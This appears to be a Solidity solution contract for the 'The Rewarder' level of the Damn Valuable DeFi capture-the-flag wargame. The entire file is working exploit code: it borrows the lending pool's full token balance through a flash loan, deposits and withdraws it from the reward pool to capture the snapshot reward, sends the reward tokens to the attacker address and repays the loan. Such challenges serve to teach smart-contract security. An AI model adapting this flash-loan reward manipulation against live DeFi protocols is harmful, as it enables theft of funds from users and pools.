// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "contracts/DamnValuableToken.sol";

contract Attacker {
    FlashLoanerPool public pool;
    TheRewarderPool public rewardPool;
    DamnValuableToken public dvt;
    address public rewardToken;
    address public attacker;

    constructor(
        address payable _pool,
        address payable _rewardPool,
        address _rewardToken,
        address _dvt,
        address _attacker
    ) {
        pool = FlashLoanerPool(_pool);
        rewardPool = TheRewarderPool(_rewardPool);
        rewardToken = _rewardToken;
        dvt = DamnValuableToken(_dvt);
        attacker = _attacker;
    }

    function attack() external payable {
        pool.flashLoan(dvt.balanceOf(address(pool)));
    }

    function receiveFlashLoan(uint256) external payable {
        uint256 amount = dvt.balanceOf(address(this));
        dvt.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        ERC20(rewardToken).transfer(
            payable(attacker),
            ERC20(rewardToken).balanceOf(address(this))
        );
        dvt.transfer(address(pool), dvt.balanceOf(address(this)));
    }

    receive() external payable {}
}
